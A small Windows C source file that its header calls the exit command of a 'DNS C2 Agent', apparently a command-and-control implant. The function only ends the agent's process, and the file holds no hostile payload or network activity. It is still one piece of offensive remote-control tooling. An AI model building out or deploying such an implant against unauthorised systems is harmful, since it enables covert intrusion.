/**
 * exit.c - Exit command for DNS C2 Agent
 */

 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include "../include/exit.h"
 
 /**
  * Exit the agent
  */
 char* cmd_exit(const char* args) {
     // Suppress unused parameter warning
     (void)args;
     
     // This will never be returned, but we need to return something
     char* result = _strdup("Exiting...");
     
     // Exit the process
     ExitProcess(0);
     
     return result;
 }
 